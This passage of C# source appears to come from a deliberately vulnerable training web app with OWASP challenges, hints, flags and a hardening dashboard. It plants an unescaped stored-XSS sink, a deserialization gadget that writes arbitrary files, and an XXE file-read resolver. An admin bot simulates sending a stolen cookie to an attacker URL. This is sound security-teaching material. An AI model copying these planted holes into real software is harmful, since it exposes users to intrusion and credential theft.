    cmd.Parameters.AddWithValue("$t", Now());
    cmd.Parameters.AddWithValue("$r", report.Length > 2000 ? report[..2000] : report);
    cmd.ExecuteNonQuery();
    return Results.StatusCode(204);
});

app.MapGet("/hardening", async (HttpContext ctx) =>
{
    // live self-check: fetch our own homepage and inspect the response headers.
    var present = new Dictionary<string, bool>();
    try
    {
        using var resp = await http.GetAsync("http://127.0.0.1:5001/");
        foreach (var h in REQUIRED_HEADERS)
            present[h] = resp.Headers.Contains(h) || resp.Content.Headers.Contains(h);
    }
    catch { foreach (var h in REQUIRED_HEADERS) present[h] = false; }

    var events = new HashSet<string>();
    using (var db = Db())
    using (var cmd = db.CreateCommand())
    {
        cmd.CommandText = "SELECT DISTINCT event FROM audit";
        using var r = cmd.ExecuteReader();
        while (r.Read()) events.Add(r.GetString(0));
    }
    int cspCount = int.Parse(ScalarStr("SELECT COUNT(*) FROM cspreport"));

    var hrows = new StringBuilder();
    foreach (var h in REQUIRED_HEADERS)
    {
        bool ok = present[h];
        hrows.Append($"<tr><td>{h}</td><td><span class=\"pill {(ok ? "ok" : "no")}\">{(ok ? "present" : "missing")}</span></td></tr>");
    }
    var lrows = new StringBuilder();
    foreach (var e in EXPECTED_EVENTS)
    {
        bool ok = events.Contains(e);
        lrows.Append($"<tr><td>{e}</td><td><span class=\"pill {(ok ? "ok" : "no")}\">{(ok ? "yes" : "never")}</span></td></tr>");
    }
    string body =
        "<div class=card><h2>Hardening dashboard</h2>" +
        "<p class=muted>Day-3 defensive targets. These start red; fix them in " +
        "<code>Program.cs</code> and save (dev mode hot-reloads) to watch them go green.</p>" +
        "<h3>Security response headers</h3>" +
        "<table><tr><th>Header</th><th>Status</th></tr>" + hrows + "</table>" +
        "<p class=muted>Fix: add the headers inside <code>SetSecurityHeaders()</code> " +
        "in <code>Program.cs</code>. Add a CSP with <code>report-uri /csp-report</code>.</p></div>" +
        "<div class=card><h3>CSP violation reports</h3>" +
        $"<p>{cspCount} report(s) received at <code>/csp-report</code>.</p></div>" +
        "<div class=card><h3>Security logging &amp; monitoring (A09)</h3>" +
        "<table><tr><th>Expected event</th><th>Logged?</th></tr>" + lrows + "</table>" +
        "<p class=muted>Fix: call <code>Audit(\"&lt;event&gt;\", detail)</code> at the " +
        "security-relevant points (login success/failure, access_denied, admin_action).</p></div>";
    return Html(Render(ctx, body));
});

// ---- Challenge detail page + scoreboard ----------------------------------- //
app.MapGet("/challenge/{cid}", (HttpContext ctx, string cid) =>
{
    if (!BY_ID.TryGetValue(cid, out var c))
        return Html(Render(ctx, "<div class=card><p>No such challenge.</p>" +
            "<a href=/scoreboard>&larr; back to scoreboard</a></div>"), 404);
    bool done = SolvedIds().Contains(cid);
    var (url, label, note) = START.TryGetValue(cid, out var s) ? s : ("/", "the app", (string?)null);
    string catname = CAT_NAMES.TryGetValue(c.Cat, out var cn) ? cn : c.Cat;

    var hints = new StringBuilder();
    for (int i = 0; i < c.Hints.Length; i++)
        hints.Append($"<div class=hint {(i == 0 ? "" : "hidden")}><b>Hint {i + 1}.</b> {Enc(c.Hints[i])}</div>");

    string statusPill = done ? "<span class=\"pill ok\">SOLVED</span>" : "<span class=\"pill no\">open</span>";
    string noteHtml = note != null ? $"<p class=warn>&#9888; {Enc(note)}</p>" : "";
    string solvedCard = done
        ? $"<div class=card><p class=flag>{Enc(c.Flag)}</p><p class=muted><b>Fix:</b> {Enc(c.Fix)}</p></div>"
        : "";

    string body =
        "<div class=card><p><a href=\"/scoreboard\">&larr; All challenges</a></p>" +
        $"<h2>{Enc(c.Title)} {statusPill}</h2>" +
        $"<p class=muted>{Enc(catname)} &middot; {c.Diff}</p>" +
        $"<p><b>Goal:</b> {Enc(c.Goal)}</p>{noteHtml}" +
        $"<p><a class=btn href=\"{url}\">&#9654; Start here &mdash; {Enc(label)}</a></p>" +
        "<p class=muted>Exploit the feature; the server detects the solve and this page " +
        "turns green. There's no flag to submit.</p></div>" +
        "<div class=card><h3>Hints</h3>" +
        "<p class=muted>Stuck? Reveal them one at a time &mdash; each is more specific than the last.</p>" +
        $"<div id=hints class=grid>{hints}</div>" +
        "<p class=row><button id=moreHint type=button>Show next hint</button> " +
        "<span id=hintCount class=muted></span></p></div>" +
        solvedCard +
        HINT_SCRIPT;
    return Html(Render(ctx, body));
});

app.MapGet("/scoreboard", (HttpContext ctx) =>
{
    var done = SolvedIds();
    var rows = new StringBuilder();
    foreach (var c in CHALLENGES)
    {
        bool ok = done.Contains(c.Id);
        string pill = ok ? "<span class=\"pill ok\">SOLVED</span>" : "<span class=\"pill no\">open</span>";
        string extra = ok ? $"<br><span class=flag>{Enc(c.Flag)}</span><br><small class=muted>Fix: {Enc(c.Fix)}</small>" : "";
        rows.Append(
            $"<tr class=\"{(ok ? "ok" : "")}\"><td>{c.Cat}</td>" +
            $"<td><b><a href=\"/challenge/{c.Id}\">{Enc(c.Title)}</a></b><br><small class=muted>{Enc(c.Goal)}</small></td>" +
            $"<td>{c.Diff}</td><td>{pill}</td>" +
            $"<td><a href=\"/challenge/{c.Id}\">Open &rarr;</a>{extra}</td></tr>");
    }
    string body =
        "<div class=card><h2>Scoreboard</h2>" +
        $"<p>{done.Count} / {CHALLENGES.Count} solved.</p>" +
        "<p class=muted>Click a challenge to open it: you'll get the goal, a <b>Start here</b> " +
        "link to the vulnerable feature, and hints you reveal one at a time. Exploit it and the " +
        "row turns green automatically.</p>" +
        "<table><tr><th>OWASP</th><th>Challenge</th><th>Diff</th><th>Status</th><th>Details</th></tr>" +
        rows + "</table></div>";
    return Html(Render(ctx, body));
});

// --------------------------------------------------------------------------- //
// Admin review bot: stored XSS must EXFILTRATE the admin cookie (not just alert)
// --------------------------------------------------------------------------- //
_ = Task.Run(AdminBot);

app.Run("http://0.0.0.0:5001");


// --------------------------------------------------------------------------- //
// Local helpers
// --------------------------------------------------------------------------- //
SqliteConnection Db()
{
    var c = new SqliteConnection("Data Source=" + DBPATH);
    c.Open();
    using var p = c.CreateCommand();
    p.CommandText = "PRAGMA busy_timeout=3000";
    p.ExecuteNonQuery();
    return c;
}

double Now() => DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0;

string Enc(string s) => WebUtility.HtmlEncode(s);

// HTML for one comment. Used by the ticket page AND the admin bot, so the bot only
// "fires" if a payload survives rendering - fix it here and the XSS stops.
// VULN (A05 stored XSS): the comment body is inserted UNESCAPED (the one XSS sink).
string RenderComment(string author, string body) => $"<p><b>{Enc(author)}:</b> {body}</p>";

IResult Html(string html, int status = 200) =>
    Results.Content(html, "text/html; charset=utf-8", Encoding.UTF8, status);

(int Id, string Name, string Role, string Password)? Current(HttpContext ctx)
{
    int? uid = ctx.Session.GetInt32("uid");
    if (uid == null) return null;
    using var c = Db();
    using var cmd = c.CreateCommand();
    cmd.CommandText = "SELECT id,name,role,password FROM users WHERE id=$i";
    cmd.Parameters.AddWithValue("$i", uid.Value);
    using var r = cmd.ExecuteReader();
    if (!r.Read()) return null;
    return (r.GetInt32(0), r.GetString(1), r.GetString(2), r.GetString(3));
}

void Solve(string cid)
{
    using var c = Db();
    using var cmd = c.CreateCommand();
    cmd.CommandText = "INSERT OR IGNORE INTO solved(cid,ts) VALUES($c,$t)";
    cmd.Parameters.AddWithValue("$c", cid);
    cmd.Parameters.AddWithValue("$t", Now());
    cmd.ExecuteNonQuery();
}

HashSet<string> SolvedIds()
{
    var set = new HashSet<string>();
    using var c = Db();
    using var cmd = c.CreateCommand();
    cmd.CommandText = "SELECT cid FROM solved";
    using var r = cmd.ExecuteReader();
    while (r.Read()) set.Add(r.GetString(0));
    return set;
}

// A09: deliberately thin. TODO(trainee): call this at the security-relevant points
// (login success/failure, access_denied, admin_action, ...).
void Audit(string ev, string detail = "")
{
    using var c = Db();
    using var cmd = c.CreateCommand();
    cmd.CommandText = "INSERT INTO audit(ts,event,detail) VALUES($t,$e,$d)";
    cmd.Parameters.AddWithValue("$t", Now());
    cmd.Parameters.AddWithValue("$e", ev);
    cmd.Parameters.AddWithValue("$d", detail);
    cmd.ExecuteNonQuery();
}

string ScalarStr(string sql)
{
    using var c = Db();
    using var cmd = c.CreateCommand();
    cmd.CommandText = sql;
    return cmd.ExecuteScalar()?.ToString() ?? "";
}

// ===== day-3 fix target: security headers =================================== //
void SetSecurityHeaders(HttpResponse resp)
{
    // TODO(trainee): add the headers in REQUIRED_HEADERS here. Saving this file
    // hot-reloads the app in ~1s (dev mode), so /hardening turns green as you go.
    // Example (see /hardening for the full checklist):
    //   resp.Headers["Content-Security-Policy"] = "default-src 'self'; report-uri /csp-report";
    //   resp.Headers["X-Content-Type-Options"] = "nosniff";
}

string Md5(string s) => Convert.ToHexString(MD5.HashData(Encoding.UTF8.GetBytes(s))).ToLowerInvariant();
string Sha256(string s) => Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(s))).ToLowerInvariant();

string HashScheme(string scheme, string pw)
{
    switch (scheme)
    {
        case "cleartext": return pw;
        case "md5": return Md5(pw);
        case "sha256": return Sha256(pw);
        case "pbkdf2":
            byte[] dk = Rfc2898DeriveBytes.Pbkdf2(
                Encoding.UTF8.GetBytes(pw), Encoding.UTF8.GetBytes("per-user-salt"),
                200000, HashAlgorithmName.SHA256, 32);
            return Convert.ToHexString(dk).ToLowerInvariant();
        case "argon2id":
            using (var a = new Argon2id(Encoding.UTF8.GetBytes(pw)))
            {
                a.Salt = Encoding.UTF8.GetBytes("per-user-salt-16");
                a.DegreeOfParallelism = 1;
                a.Iterations = 2;
                a.MemorySize = 1 << 16; // 64 MiB
                return "$argon2id$" + Convert.ToBase64String(a.GetBytes(32));
            }
        default: return "?";
    }
}

string? Crack(string h)
{
    foreach (var w in CRACK_WORDLIST)
        if (Md5(w) == h || Sha256(w) == h) return w;
    return null;
}

(string Cls, string Label) Verdict(string scheme, string h)
{
    switch (scheme)
    {
        case "cleartext": return ("no", "Plaintext - fully exposed");
        case "md5":
        case "sha256":
            var w = Crack(h);
            return w != null ? ("no", "Cracked: " + w) : ("warn", "Fast hash - crackable offline");
        case "pbkdf2": return ("ok", "Salted + slow (200k) - resistant");
        case "argon2id": return ("ok", "Memory-hard - resistant");
        default: return ("warn", "?");
    }
}

// ---- page rendering ------------------------------------------------------- //
string Render(HttpContext ctx, string body)
{
    var u = Current(ctx);
    string nav;
    if (u is { } user)
    {
        string adminLink = user.Role == "admin" ? "<a href=\"/admin\">Admin</a>" : "";
        nav = adminLink +
              $"<span class=\"sp u\">{Enc(user.Name)} &middot; {Enc(user.Role)} &middot; <a href=\"/logout\">logout</a></span>";
    }
    else
    {
        nav = "<span class=sp><a href=\"/login\">login</a> <a href=\"/register\">register</a></span>";
    }
    return BASE.Replace("[[NAV]]", nav).Replace("[[BODY]]", body);
}

string LoginForm() =>
    "<div class=card><h2>Sign in</h2><form method=post class=grid>" +
    "<div><label>Username</label><input name=username autofocus></div>" +
    "<div><label>Password</label><input name=password type=password></div>" +
    "<div><button>Sign in</button></div></form>" +
    "<p class=muted>Demo users: alice / alicepw, bob / bobpw</p></div>";

string RegisterForm() =>
    "<div class=card><h2>Register</h2><form method=post class=grid>" +
    "<div><label>Username</label><input name=username></div>" +
    "<div><label>Password</label><input name=password type=password></div>" +
    "<div><button>Create account</button></div></form></div>";

string ImportForm(string? result)
{
    string sample = "<?xml version=\"1.0\"?>\n<ticket><title>Hello</title><body>from XML</body></ticket>";
    string parsed = result != null ? $"<h3>Parsed</h3><pre>{Enc(result)}</pre>" : "";
    return "<div class=card><h2>Import ticket from XML</h2>" +
           $"<form method=post class=grid><textarea name=xml rows=6>{Enc(sample)}</textarea>" +
           "<div><button>Import</button></div></form>" + parsed + "</div>";
}

string ProfilePage((int Id, string Name, string Role, string Password) u) =>
    $"<div class=card><h2>Profile: {Enc(u.Name)}</h2><p>Role: <b>{Enc(u.Role)}</b></p>" +
    "<form method=post class=grid><div><label>New password</label><input name=password></div>" +
    "<div><button>Save</button></div></form></div>" +
    "<div class=card><h3>Avatar by URL</h3>" +
    "<form action=/profile/avatar class=grid><input name=url placeholder=http://...>" +
    "<div><button>Fetch</button></div></form></div>" +
    "<div class=card><h3>Export / import profile</h3>" +
    "<p><a href=/profile/export>Export</a> (base64 blob)</p>" +
    "<form method=post action=/profile/import class=grid>" +
    "<input name=blob placeholder=\"base64 blob\"><div><button>Import</button></div></form></div>";

string StoragePage(string pw, string? submitted)
{
    string[] schemes = { "cleartext", "md5", "sha256", "pbkdf2", "argon2id" };
    var rows = new StringBuilder();
    foreach (var s in schemes)
    {
        string h = HashScheme(s, pw);
        var (cls, label) = Verdict(s, h);
        rows.Append($"<tr><td>{s}</td><td><code>{Enc(h)}</code></td>" +
                    $"<td><span class=\"pill {cls}\">{Enc(label)}</span></td></tr>");
    }
    bool ok = submitted != null && Md5(submitted) == CRACK_TARGET;
    string verdictLine = submitted != null
        ? $"<p class=\"{(ok ? "flag" : "warn")}\">{(ok ? "Correct - FLAG{weak_hash_cracked}" : "nope, keep trying")}</p>"
        : "";
    return "<div class=card><h2>Credential storage</h2>" +
           "<p class=muted>Enter a password and see how each scheme would store it, with an " +
           "honest verdict. A quick wordlist is run against the fast hashes.</p>" +
           $"<form method=post class=row><input name=pw value=\"{Enc(pw)}\"><button>Hash it</button></form>" +
           "<table class=fixed><tr><th>Scheme</th><th>Stored value</th><th>Verdict</th></tr>" +
           rows + "</table>" +
           "<p class=muted><span class=\"pill no\">red</span> broken &middot; " +
           "<span class=\"pill warn\">amber</span> weak (fast, brute-forceable) &middot; " +
           "<span class=\"pill ok\">green</span> use this (salted + slow). Fix the app to store " +
           "with Argon2id.</p></div>" +
           "<div class=card><h3>Challenge: crack the leaked hash</h3>" +
           "<p>A breach dumped this unsalted MD5. Recover the plaintext and submit it.</p>" +
           $"<p><code>{CRACK_TARGET}</code></p>" +
           $"<form method=post class=row><input type=hidden name=pw value=\"{Enc(pw)}\">" +
           "<input name=plain placeholder=\"plaintext\"><button>Submit</button></form>" +
           verdictLine + "</div>";
}

// ---- startup helpers ------------------------------------------------------ //
void PrepareRuntimeFiles()
{
    // Loot files + the deser canary are NOT progress; (re)create them on every boot.
    File.WriteAllText(CMDI_FLAG_FILE, "FLAG{os_command_injection_rce}\n");
    File.WriteAllText(XXE_SECRET_FILE, "FLAG{xxe_file_disclosure}\n");
    try { File.Delete(DESER_CANARY); } catch { }
}

void Seed()
{
    using var c = new SqliteConnection("Data Source=" + DBPATH);
    c.Open();
    using var cmd = c.CreateCommand();
    cmd.CommandText = @"
        DROP TABLE IF EXISTS users; DROP TABLE IF EXISTS tickets;
        DROP TABLE IF EXISTS comments; DROP TABLE IF EXISTS solved;
        DROP TABLE IF EXISTS collector; DROP TABLE IF EXISTS cspreport; DROP TABLE IF EXISTS audit;
        CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT UNIQUE, password TEXT, role TEXT);
        CREATE TABLE tickets (id INTEGER PRIMARY KEY, owner TEXT, title TEXT, body TEXT);
        CREATE TABLE comments (id INTEGER PRIMARY KEY, ticket_id INT, author TEXT, body TEXT, seen INT DEFAULT 0);
        CREATE TABLE solved (cid TEXT PRIMARY KEY, ts REAL);
        CREATE TABLE collector (id INTEGER PRIMARY KEY, ts REAL, data TEXT);
        CREATE TABLE cspreport (id INTEGER PRIMARY KEY, ts REAL, report TEXT);
        CREATE TABLE audit (id INTEGER PRIMARY KEY, ts REAL, event TEXT, detail TEXT);
        INSERT INTO users(name,password,role) VALUES
          ('admin','S3cr3t-R00t-P@ss','admin'),('alice','alicepw','user'),('bob','bobpw','user');
        INSERT INTO tickets(owner,title,body) VALUES
          ('alice','VPN down','Cannot connect from home.'),
          ('bob','Printer jam','3rd floor printer offline.'),
          ('admin','Recovery codes','Internal only - do not share.');
    ";
    cmd.ExecuteNonQuery();
}

// ---- admin review bot ----------------------------------------------------- //
async Task AdminBot()
{
    // a REAL sink: a live <script> tag, or a live tag carrying an on*= handler
    // (escaped output has no '<', so it never matches).
    var sinkRe = new Regex(@"<script|<[a-z][^>]*[\s/]on[a-z]+\s*=");
    var urlRe = new Regex("https?://[^\\s'\"<>()]+");
    while (true)
    {
        try
        {
            var pending = new List<(int Id, string Body)>();
            using (var c = Db())
            using (var cmd = c.CreateCommand())
            {
                cmd.CommandText = "SELECT id,body FROM comments WHERE seen=0";
                using var r = cmd.ExecuteReader();
                while (r.Read()) pending.Add((r.GetInt32(0), r.IsDBNull(1) ? "" : r.GetString(1)));
            }
            foreach (var (id, body) in pending)
            {
                string low = body.ToLowerInvariant();
                // the admin "views" the ticket: judge what the page actually renders,
                // so output-encoding the comment (the fix) stops the payload firing.
                string rendered = RenderComment("", body).ToLowerInvariant();
                bool fired = sinkRe.IsMatch(rendered);
                bool exfil = low.Contains("document.cookie");
                var m = urlRe.Match(body);
                if (fired && exfil && m.Success)
                {
                    // the admin's browser "runs" the payload: cookie leaves to the URL.
                    string target = m.Value.Split('?')[0].TrimEnd('+', '\'', '"', ')', ' ');
                    try { await http.GetAsync(target + "?c=" + Uri.EscapeDataString(ADMIN_COOKIE)); } catch { }
                    Solve("xss_stored");
                }
                using var c = Db();
                using var cmd = c.CreateCommand();
                cmd.CommandText = "UPDATE comments SET seen=1 WHERE id=$i";
                cmd.Parameters.AddWithValue("$i", id);
                cmd.ExecuteNonQuery();
            }
        }
        catch { /* keep the bot alive */ }
        await Task.Delay(2000);
    }
}


// --------------------------------------------------------------------------- //
// Types
// --------------------------------------------------------------------------- //
record Challenge(string Id, string Cat, string Diff, string Title, string Goal,
                 string[] Hints, string Flag, string Fix);

// Plain profile shape used by export/import (the benign, intended payload).
public class ProfileBlob
{
    public string? Name { get; set; }
    public string? Role { get; set; }
    public override string ToString() => $"ProfileBlob(name={Name}, role={Role})";
}

// VULN (A08) gadget: a plausible "cache warmer" an exported profile might carry.
// Because import uses TypeNameHandling.All, a crafted blob can name THIS type and
// its post-deserialization hook writes an attacker-chosen file (the canary).
public class ProfileCacheEntry
{
    public string? FilePath { get; set; }
    public string? Content { get; set; }

    [OnDeserialized]
    internal void OnDeserialized(StreamingContext _)
    {
        try { if (!string.IsNullOrEmpty(FilePath)) File.WriteAllText(FilePath, Content ?? ""); }
        catch { }
    }

    public override string ToString() => $"ProfileCacheEntry({FilePath})";
}

// Resolver that allows only file:// entities (no network) - parity with Python's
// no_network XXE parser.
public class FileOnlyXmlResolver : XmlUrlResolver
{
    public override object GetEntity(Uri absoluteUri, string? role, Type? ofObjectToReturn)
    {
        if (absoluteUri.Scheme != "file")
            throw new XmlException("network entities are disabled");
        return base.GetEntity(absoluteUri, role, ofObjectToReturn)!;
    }
}
